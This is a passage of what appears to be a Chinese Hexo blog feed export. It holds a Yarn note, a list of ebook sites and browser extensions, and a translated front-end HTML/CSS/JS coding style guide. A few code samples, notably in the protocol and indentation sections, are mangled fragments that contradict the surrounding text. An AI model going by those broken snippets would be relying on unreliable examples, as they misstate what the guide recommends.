<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yarn</span><br><span class="line">或者</span><br><span class="line">yarn install</span><br></pre></td></tr></table></figure>
<blockquote>
<p>延伸阅读<br />
<a href="https://yarnpkg.com/zh-Hans/docs/yarn-workflow" target="_blank" rel="noopener">Yarn 工作流(如何使用Yarn？方便的创建与使用Yarn包的工作流程将帮你快速提高生产力。)</a><br />
<a href="https://yarnpkg.com/zh-Hans/docs/cli/" target="_blank" rel="noopener">CLI 命令(Yarn 通过一组丰富的命令执行包安装、管理、发布等操作。)</a></p>
</blockquote>
<blockquote>
<p><a href="https://yarnpkg.com/zh-Hans/docs" target="_blank" rel="noopener">官方文档</a></p>
</blockquote>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>yarn</tag>
        <tag>npm</tag>
        <tag>包管理</tag>
      </tags>
  </entry>
  <entry>
    <title>优质资源整理收藏</title>
    <url>/hexolog/post/5d70cfef.html</url>
    <content><![CDATA[<blockquote>
<p>📌 推荐一些实用的好资源</p>
</blockquote>
<h3 id="电子书籍"><a class="markdownIt-Anchor" href="#电子书籍"></a> 电子书籍</h3>
<table>
<thead>
<tr>
<th style="text-align:center">网站</th>
<th style="text-align:center">推荐星级</th>
<th style="text-align:center">标签</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><a href="http://readfree.me/" target="_blank" rel="noopener">Readfree</a></td>
<td style="text-align:center">⭐️⭐️⭐️⭐️⭐️</td>
<td style="text-align:center"><code>中文/英文</code>、<code>种类多</code>、<code>数量全</code>、<code>有评分</code>、<code>有介绍</code>、<code>活跃度高</code>、<code>需登录</code></td>
</tr>
<tr>
<td style="text-align:center"><a href="http://www.allitebooks.com/" target="_blank" rel="noopener">All IT eBooks</a></td>
<td style="text-align:center">⭐️⭐️⭐️⭐️⭐️</td>
<td style="text-align:center"><code>英文</code>、<code>分类全</code>、<code>PDF</code>、<code>高质量</code></td>
</tr>
<tr>
<td style="text-align:center"><a href="https://1bookcase.com/" target="_blank" rel="noopener">1Bookcase</a></td>
<td style="text-align:center">⭐️⭐️⭐️</td>
<td style="text-align:center"><code>英文</code>、<code>高质量</code>、<code>有介绍</code>、<code>数量较少</code>、<code>有广告</code></td>
</tr>
<tr>
<td style="text-align:center"><a href="http://books.iteblog.com/" target="_blank" rel="noopener">ITBooks</a></td>
<td style="text-align:center">⭐️⭐️⭐️</td>
<td style="text-align:center"><code>中文/英文</code>、<code>高质量</code>、<code>有介绍</code>、<code>数量较少</code></td>
</tr>
<tr>
<td style="text-align:center"><a href="http://cn.epubee.com/books/" target="_blank" rel="noopener">ePUBee</a></td>
<td style="text-align:center">⭐️⭐️⭐️</td>
<td style="text-align:center"><code>中文/英文</code>、<code>种类多</code></td>
</tr>
</tbody>
</table>
<h3 id="浏览器插件"><a class="markdownIt-Anchor" href="#浏览器插件"></a> 浏览器插件</h3>
<ul>
<li>
<p><strong>阅读辅助类</strong>：</p>
<ol>
<li><a href="http://ksria.com/simpread/" target="_blank" rel="noopener">简阅</a></li>
<li><a href="https://www.twinword.com/finder/" target="_blank" rel="noopener">Twinword Finder</a></li>
<li><a href="https://chrome.google.com/webstore/detail/pfgfgjlejbbpfmcfjhdmikihihddeeji" target="_blank" rel="noopener">Multi-highlight</a></li>
<li><a href="https://chrome.google.com/webstore/detail/nikccehomlnjkmgmhnieecolhgdafajb" target="_blank" rel="noopener">Beanote - Note Taking on Web Pages</a></li>
<li><a href="https://chrome.google.com/webstore/detail/cdonnmffkdaoajfknoeeecmchibpmkmg" target="_blank" rel="noopener">沙拉查词-网页划词翻译</a></li>
<li><a href="https://chrome.google.com/webstore/detail/pgkdcepboeicdjeklohlkhjnoaadbpbj" target="_blank" rel="noopener">Reading list</a>，同类还有<a href="https://chrome.google.com/webstore/detail/lloccabjgblebdmncjndmiibianflabo" target="_blank" rel="noopener">阅读列表</a></li>
<li><a href="https://chrome.google.com/webstore/detail/fmlboobidmkelggdainpknloccojpppi" target="_blank" rel="noopener">Screen Shader - F.lux for Chrome</a></li>
</ol>
</li>
<li>
<p><strong>管理工具类</strong></p>
<ol>
<li><a href="https://chrome.google.com/webstore/detail/ghgabhipcejejjmhhchfonmamedcbeod" target="_blank" rel="noopener">Click &amp; Clean</a></li>
<li><a href="https://chrome.google.com/webstore/detail/nnnkddnnlpamobajfibfdgfnbcnkgngh" target="_blank" rel="noopener">Infinity</a></li>
<li><a href="https://adguard.com/zh_cn/adguard-browser-extension/overview.html" target="_blank" rel="noopener">AdGuard</a>，同类还有<a href="https://chrome.google.com/webstore/detail/cjpalhdlnbpafiamejdnhcphjbkeiagm" target="_blank" rel="noopener">uBlock Origin</a></li>
<li><a href="https://chrome.google.com/webstore/detail/dhdgffkkebhmkfjojejmpbldmpobfkfo" target="_blank" rel="noopener">Tampermonkey</a></li>
<li><a href="https://chrome.google.com/webstore/detail/aajodjghehmlpahhboidcpfjcncmcklf" target="_blank" rel="noopener">二管家</a></li>
</ol>
<blockquote>
<p>同为扩展管理工具的还有： <a href="https://chrome.google.com/webstore/detail/gjldcdngmdknpinoemndlidpcabkggco" target="_blank" rel="noopener">Extension Manager</a>、<a href="https://chrome.google.com/webstore/detail/jjmflmamggggndanpgfnpelongoepncg" target="_blank" rel="noopener">Extensity</a>、<a href="https://chrome.google.com/webstore/detail/bgejgfcdaicmfbfphchgcdgnpnbcondb" target="_blank" rel="noopener">扩展管理</a>、<a href="https://chrome.google.com/webstore/detail/kniehgiejgnnpgojkdhhjbgbllnfkfdk" target="_blank" rel="noopener">Simple Ext Manager</a>、<a href="https://chrome.google.com/webstore/detail/kfjmkgngkgpgjdoealkmmajmmhpnffoj" target="_blank" rel="noopener">一键管理</a>、<a href="https://github.com/HangYang/one-click-extensions-manager" target="_blank" rel="noopener">快捷扩展管理</a></p>
</blockquote>
<ol start="5">
<li><a href="https://chrome.google.com/webstore/detail/gokgophibdidjjpildcdbfpmcahilaaf" target="_blank" rel="noopener">下载+</a>、<a href="https://chrome.google.com/webstore/detail/ilppkoakomgpcblpemgbloapenijdcho" target="_blank" rel="noopener">Video Downloader Pro</a></li>
<li><a href="https://chrome.google.com/webstore/detail/hkojjajclkgeijhcmfjcjkddfjpaimek" target="_blank" rel="noopener">二维码生成及识别</a></li>
<li><a href="https://chrome.google.com/webstore/detail/dohkaoejmhididdilnijehaeegkgchfl" target="_blank" rel="noopener">短网址二维码生成器</a></li>
<li><a href="https://github.com/Kiuryy/Bookmark_Sidebar" target="_blank" rel="noopener">书签侧边栏</a></li>
</ol>
<blockquote>
<p>同为书签管理工具的还有： <a href="https://chrome.google.com/webstore/detail/jnbabccejebnlmnjendoibdlbpbgbham" target="_blank" rel="noopener">Bookmarks Hotlist</a>、<a href="https://chrome.google.com/webstore/detail/mppflflkbbafeopeoeigkbbdjdbeifni" target="_blank" rel="noopener">Popup my Bookmarks</a>、<a href="https://chrome.google.com/webstore/detail/edgcdcdceojjbiebdbgmacecicaknjih" target="_blank" rel="noopener">Bookmarks</a></p>
</blockquote>
</li>
<li>
<p><strong>开发工具</strong></p>
<ol>
<li><a href="https://webmakerapp.com/" target="_blank" rel="noopener">Web Maker</a></li>
<li><a href="http://team.firefoxcn.net/#addons" target="_blank" rel="noopener">Header Editor</a></li>
<li><a href="https://www.baidufe.com/fehelper" target="_blank" rel="noopener">WEB前端助手/FeHelper</a></li>
<li><a href="https://chrome.google.com/webstore/detail/lhbbbidpkalopmenjffckblgbdhcffpa" target="_blank" rel="noopener">Css3Animation</a></li>
<li><a href="https://chrome.google.com/webstore/detail/ffabmkklhbepgcgfonabamgnfafbdlkn" target="_blank" rel="noopener">GitZip for github</a></li>
<li><a href="http://www.editthiscookie.com/" target="_blank" rel="noopener">EditThisCookie</a></li>
<li><a href="http://alloyteam.github.io/AlloyDesigner/" target="_blank" rel="noopener">AlloyDesigner</a></li>
<li><a href="https://github.com/justjavac/ChromeSnifferPlus" target="_blank" rel="noopener">LibSniffer</a></li>
<li><a href="https://chrome.google.com/webstore/detail/mmdjghedkfbdhbjhmefbbgjaihmmhkeg" target="_blank" rel="noopener">Servistate HTTP Editor &amp; REST API Client</a></li>
<li><a href="http://colorhunt.co/" target="_blank" rel="noopener">Color Hunt</a></li>
<li><a href="https://chrome.google.com/webstore/detail/css-peeper/mbnbehikldjhnfehhnaidhjhoofhpehk" target="_blank" rel="noopener">css-peeper</a></li>
<li><a href="https://chrome.google.com/webstore/detail/dimensions/baocaagndhipibgklemoalmkljaimfdj" target="_blank" rel="noopener">dimensions</a></li>
<li><a href="https://chrome.google.com/webstore/detail/perfectpixel-by-welldonec/dkaagdgjmgdmbnecmcefdhjekcoceebi" target="_blank" rel="noopener">perfectpixel-by-welldonecode</a></li>
</ol>
</li>
<li>
<p><strong>消息阅读类</strong></p>
<ol>
<li><a href="https://chrome.google.com/webstore/detail/inoreader-companion/kfimphpokifbjgmjflanmfeppcjimgah" target="_blank" rel="noopener">inoreader</a></li>
<li><a href="https://chrome.google.com/webstore/detail/panda-5-news-inspiration/haafibkemckmbknhfkiiniobjpgkebko" target="_blank" rel="noopener">Panda 5 | News &amp; Inspiration Dashboard</a></li>
<li><a href="https://chrome.google.com/webstore/detail/%E6%8E%98%E9%87%91/lecdifefmmfjnjjinhaennhdlmcaeeeb" target="_blank" rel="noopener">掘金</a></li>
<li><a href="https://chrome.google.com/webstore/detail/muzli-2-stay-inspired/glcipcfhmopcgidicgdociohdoicpdfc" target="_blank" rel="noopener">Muzli 2 - Stay Inspired</a></li>
</ol>
</li>
</ul>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>收藏</tag>
        <tag>分享</tag>
      </tags>
  </entry>
  <entry>
    <title>前端编码风格规范(1) 之 一般规范</title>
    <url>/hexolog/post/226a05d8.html</url>
    <content><![CDATA[<blockquote>
<p>英文原文：<a href="https://github.com/gionkunz/chartist-js/blob/develop/CODINGSTYLE.md" target="_blank" rel="noopener">Web Styleguide – Style guide to harmonize HTML, Javascript and CSS / SASS coding style</a></p>
</blockquote>
<p>这是一份旨在增强团队的开发协作，提高代码质量和打造开发基石的编码风格规范，其中包含了 HTML, JavaScript 和 CSS/SCSS 这几个部分。我们知道，当一个团队开始指定并实行编码规范的话，错误就会变得更加显而易见。如果一段特定的代码不符合规范的话，它有可能只是代码风格错误，而也有可能会是 bug。早期指定规范就使得代码审核得以更好的开展，并且可以更精确的地定位到错误。只要开发者们能够保证源代码源文件都严格遵循规范，那接下去所使用的混淆、压缩和编译工具则可投其所好不尽相同。</p>
<a id="more"></a>
<hr />
<h2 id="一般规范"><a class="markdownIt-Anchor" href="#一般规范"></a> 一般规范</h2>
<p>以下章节列举了一些可应用在 HTML, JavaScript 和 CSS/SCSS 上的通用规则。</p>
<hr />
<h3 id="文件资源命名"><a class="markdownIt-Anchor" href="#文件资源命名"></a> 文件/资源命名</h3>
<p>在 web 项目中，所有的文件名应该都遵循同一命名约定。以可读性而言，减号（-）是用来分隔文件名的不二之选。同时它也是常见的 URL 分隔符（i.e. <code>//example.com/blog/my-blog-entry</code> or <code>//s.example.com/images/big-black-background.jpg</code>），所以理所当然的，减号应该也是用来分隔资源名称的好选择。</p>
<p>请确保文件命名总是以字母开头而不是数字。而以特殊字符开头命名的文件，一般都有特殊的含义与用处（比如 compass<a href="http://usejsdoc.org/" target="_blank" rel="noopener">1</a> 中的下划线就是用来标记跳过直接编译的文件用的）。</p>
<p>资源的字母名称必须全为小写，这是因为在某些对大小写字母敏感的操作系统中，当文件通过工具压缩混淆后，或者人为修改过后，大小写不同而导致引用文件不同的错误，很难被发现。</p>
<p>还有一些情况下，需要对文件增加前后缀或特定的扩展名（比如 .min.js, .min.css），抑或一串前缀（比如 <code>3fa89b.main.min.css</code>）。这种情况下，建议使用点分隔符来区分这些在文件名中带有清晰意义的元数据。</p>
<p><strong>不推荐</strong></p>
<pre><code>MyScript.js
myCamelCaseName.css
i_love_underscores.html
1001-scripts.js
my-file-min.css
</code></pre>
<p><strong>推荐</strong></p>
<pre><code>my-script.js
my-camel-case-name.css
i-love-underscores.html
thousand-and-one-scripts.js
my-file.min.css
</code></pre>
<hr />
<h3 id="协议"><a class="markdownIt-Anchor" href="#协议"></a> 协议</h3>
<p>不要指定引入资源所带的具体协议。</p>
<p>当引入图片或其他媒体文件，还有样式和脚本时，URLs 所指向的具体路径，不要指定协议部分（<code>http:</code>, <code>https:</code>），除非这两者协议都不可用。</p>
<p>不指定协议使得 URL 从绝对的获取路径转变为相对的，在请求资源协议无法确定时非常好用，而且还能为文件大小节省几个字节。</p>
<p><strong>不推荐</strong></p>
<pre><code>http://www.google-analytics.com/ga.js&quot;&gt; src=&quot;&quot;&gt;http://cdn.com/foundation.min.js&quot;&gt;
</code></pre>
<p><strong>推荐</strong></p>
<pre><code>&quot;&gt;http://cdn.com/foundation.min.js&quot;&gt;
</code></pre>
<p><strong>不推荐</strong></p>
<pre><code>.example {
  background: url(http://static.example.com/images/bg.jpg);
}
</code></pre>
<p><strong>推荐</strong></p>
<pre><code>.example {
  background: url(//static.example.com/images/bg.jpg);
}
</code></pre>
<hr />
<h3 id="文本缩进"><a class="markdownIt-Anchor" href="#文本缩进"></a> 文本缩进</h3>
<p>一次缩进两个空格。</p>
<p>Fantastic</p>
<p>Great</p>
<pre><code>    Test&quot;&gt;http://www.css88.com#&quot;&gt;Test
  





@media screen and (min-width: 1100px) {
  body {
    font-size: 100%;
  }
}


(function(){
  var x = 10;

  function y(a, b) {
    return {
      result: (a + b) * x
    }

  }
}());
</code></pre>
<hr />
<h3 id="注释"><a class="markdownIt-Anchor" href="#注释"></a> 注释</h3>
<p>注释是<strong>你自己</strong>与你的小伙伴们了解代码写法和目的的唯一途径。特别是在写一些看似琐碎的无关紧要的代码时，由于记忆点不深刻，注释就变得尤为重要了。</p>
<p>编写自解释代码只是一个<strong>传说</strong>，没有任何代码是可以完全自解释的。而代码注释，则是永远也不嫌多。</p>
<p>当你写注释时一定要注意：不要写你的代码都干了些什么，而要写你的代码为什么要这么写，背后的考量是什么。当然也可以加入所思考问题或是解决方案的链接地址。</p>
<p><strong>不推荐</strong></p>
<pre><code>var offset = 0;

if(includeLabels) {
  // Add offset of 20
  offset = 20;
}
</code></pre>
<p><strong>推荐</strong></p>
<pre><code>var offset = 0;

if(includeLabels) {
  // If the labels are included we need to have a minimum offset of 20 pixels
  // We need to set it explicitly because of the following bug: http://somebrowservendor.com/issue-tracker/ISSUE-1
  offset = 20;
}
</code></pre>
<p>一些注释工具可以帮助你写出更好的注释。<a href="http://usejsdoc.org/" target="_blank" rel="noopener">JSDoc</a> 或 <a href="http://yui.github.io/yuidoc/" target="_blank" rel="noopener">YUIDoc</a> 就是用来写 JavaScript 注释用的。你甚至可以使用工具来为这些注释生成文档，这也是激励开发者们写注释的一个好方法，因为一旦有了这样方便的生成文档的工具，他们通常会开始花更多时间在注释细节上。</p>
<hr />
<h3 id="代码检查"><a class="markdownIt-Anchor" href="#代码检查"></a> 代码检查</h3>
<p>对于比较宽松自由的编程语言来说，严格遵循编码规范和格式化风格指南就显得极为重要。遵循规范固然很好，但是有自动化流程来确保其执行情况，岂不更佳。Trust is good, control is better.</p>
<p>对于 JavaScript，建议使用 <a href="http://www.jslint.com/" target="_blank" rel="noopener">JSLint</a> 或 <a href="http://www.jshint.com/" target="_blank" rel="noopener">JSHint</a>。</p>
<hr />
<p><a href="http://usejsdoc.org/" target="_blank" rel="noopener">1</a>： Compass 是一个基于 Sass 开源的 CSS 框架，而 Sass 是一个非常流行的 CSS 预编译器。</p>
<hr />
<h2 id="系列文章"><a class="markdownIt-Anchor" href="#系列文章"></a> 系列文章</h2>
]]></content>
      <categories>
        <category>前端编码规范</category>
        <category>Front-End&quot;</category>
        <category>搬运整理</category>
      </categories>
      <tags>
        <tag>编码规范</tag>
      </tags>
  </entry>
  <entry>
    <title>前端编码风格规范(2) 之 HTML 规范</title>
    <url>/hexolog/post/64839f25.html</url>
    <content><![CDATA[<h2 id="文档类型"><a class="markdownIt-Anchor" href="#文档类型"></a> 文档类型</h2>
<p>推荐使用 HTML5 的文档类型申明： <code>&lt;!DOCTYPE html&gt;</code>.</p>
<p>（建议使用 text/html 格式的 HTML。避免使用 XHTML。XHTML 以及它的属性，比如  <code>application/xhtml+xml</code>在浏览器中的应用支持与优化空间都十分有限）。</p>
<p>HTML 中最好不要将无内容元素（主要包括：<code>area</code>, <code>base</code>, <code>br</code>, <code>col</code>, <code>command</code>, <code>embed</code>, <code>hr</code>, <code>img</code>,  <code>input</code>, <code>keygen</code>, <code>link</code>, <code>meta</code>, <code>param</code>, <code>source</code>, <code>track</code>, <code>wbr</code>）的标签闭合，例如：使用 <code>&lt;br&gt;</code> 而非 <code>&lt;br /&gt;</code>.</p>
<hr />
<h2 id="html-验证"><a class="markdownIt-Anchor" href="#html-验证"></a> HTML 验证</h2>
<p>一般情况下，建议使用能通过标准规范验证的 HTML 代码，除非在性能优化和控制文件大小上不得不做出让步。</p>
<p>使用诸如 W3C HTML validator 这样的工具来进行检测。</p>
<p>规范化的 HTML 是显现技术要求与局限的显著质量基线，它促进了 HTML 被更好地运用。</p>
<a id="more"></a>
<p><strong>不推荐</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>Test<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">article</span>&gt;</span>This is only a test.</span><br></pre></td></tr></table></figure>
<p><strong>推荐</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>Test<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">article</span>&gt;</span>This is only a test.<span class="tag">&lt;/<span class="name">article</span>&gt;</span></span><br></pre></td></tr></table></figure>
<hr />
<h2 id="省略可选标签"><a class="markdownIt-Anchor" href="#省略可选标签"></a> 省略可选标签</h2>
<p>HTML5 规范中规定了 HTML 标签是可以省略的。但从可读性来说，在开发的源文件中最好不要这样做，因为省略标签可能会导致一些问题。</p>
<p>省略一些可选的标签确实使得页面大小减少，这很有用，尤其是对于一些大型网站来说。为了达到这一目的，我们可以在开发后期对页面进行压缩处理，在这个环节中这些可选的标签完全就可以省略掉了。</p>
<hr />
<h2 id="脚本加载"><a class="markdownIt-Anchor" href="#脚本加载"></a> 脚本加载</h2>
<p>出于性能考虑，脚本异步加载很关键。一段脚本放置在 <code>&lt;head&gt;</code> 内，比如  <code>&lt;script src=&quot;main.js&quot;&gt;&lt;/script&gt;</code>，其加载会一直阻塞 DOM 解析，直至它完全地加载和执行完毕。这会造成页面显示的延迟。特别是一些重量级的脚本，对用户体验来说那真是一个巨大的影响。</p>
<p>异步加载脚本可缓解这种性能影响。如果只需兼容 IE10+，可将 HTML5 的 async 属性加至脚本中，它可防止阻塞 DOM 的解析，甚至你可以将脚本引用写在 <code>&lt;head&gt;</code> 里也没有影响。</p>
<p>如需兼容老旧的浏览器，实践表明可使用用来动态注入脚本的脚本加载器。你可以考虑 <a href="http://yepnopejs.com/" target="_blank" rel="noopener">yepnope</a> 或 <a href="http://labjs.com/" target="_blank" rel="noopener">labjs</a>。注入脚本的一个问题是：<a href="https://www.igvita.com/2014/05/20/script-injected-async-scripts-considered-harmful/" target="_blank" rel="noopener">一直要等到 CSS 对象文档已就绪，它们才开始加载</a>（短暂地在 CSS 加载完毕之后），这就对需要及时触发的 JS 造成了一定的延迟，这多多少少也影响了用户体验吧。</p>
<p>终上所述，兼容老旧浏览器(IE9-)时，应该遵循以下最佳实践。</p>
<p>脚本引用写在 body 结束标签之前，并带上 async 属性。这虽然在老旧浏览器中不会异步加载脚本，但它只阻塞了 body 结束标签之前的 DOM 解析，这就大大降低了其阻塞影响。而在现代浏览器中，脚本将在 DOM 解析器发现 body 尾部的 script 标签才进行加载，此时加载属于异步加载，不会阻塞 CSSOM（但其执行仍发生在 CSSOM 之后）。</p>
<p><strong>所有浏览器中，推荐</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"main.css"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- body goes here --&gt;</span></span><br><span class="line"> </span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"main.js"</span> <span class="attr">async</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>只在现代浏览器中，推荐</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"main.css"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"main.js"</span> <span class="attr">async</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- body goes here --&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<hr />
<h2 id="语义化"><a class="markdownIt-Anchor" href="#语义化"></a> 语义化</h2>
<p>根据元素（有时被错误地称作“标签”）其被创造出来时的初始意义来使用它。打个比方，用 heading 元素来定义头部标题，p 元素来定义文字段落，用 a 元素来定义链接锚点，等等。</p>
<p>有根据有目的地使用 HTML 元素，对于可访问性、代码重用、代码效率来说意义重大。</p>
<p>以下示例列出了一些的语义化 HTML 主要情况：</p>
<p><strong>不推荐</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">b</span>&gt;</span>My page title<span class="tag">&lt;/<span class="name">b</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"top-navigation"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"nav-item"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#home"</span>&gt;</span>Home<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"nav-item"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#news"</span>&gt;</span>News<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"nav-item"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#about"</span>&gt;</span>About<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"news-page"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"page-section news"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"title"</span>&gt;</span>All news articles<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"news-article"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">h2</span>&gt;</span>Bad article<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"intro"</span>&gt;</span>Introduction sub-title<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"content"</span>&gt;</span>This is a very bad example for HTML semantics<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"article-side-notes"</span>&gt;</span>I think I'm more on the side and should not receive the main credits<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"article-foot-notes"</span>&gt;</span></span><br><span class="line">        This article was created by David <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"time"</span>&gt;</span>2014-01-01 00:00<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"> </span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"section-footer"</span>&gt;</span></span><br><span class="line">      Related sections: Events, Public holidays</span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"page-footer"</span>&gt;</span></span><br><span class="line">  Copyright 2014</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>推荐</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- The page header should go into a header element --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">header</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- As this title belongs to the page structure it's a heading and h1 should be used --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h1</span>&gt;</span>My page title<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">header</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">&lt;!-- All navigation should go into a nav element --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">nav</span> <span class="attr">class</span>=<span class="string">"top-navigation"</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- A listing of elements should always go to UL (OL for ordered listings) --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"nav-item"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#home"</span>&gt;</span>Home<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"nav-item"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#news"</span>&gt;</span>News<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"nav-item"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#about"</span>&gt;</span>About<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">nav</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">&lt;!-- The main part of the page should go into a main element (also use role="main" for accessibility) --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">main</span> <span class="attr">class</span>=<span class="string">"news-page"</span> <span class="attr">role</span>=<span class="string">"main"</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- A section of a page should go into a section element. Divide a page into sections with semantic elements. --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">section</span> <span class="attr">class</span>=<span class="string">"page-section news"</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- A section header should go into a section element --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span 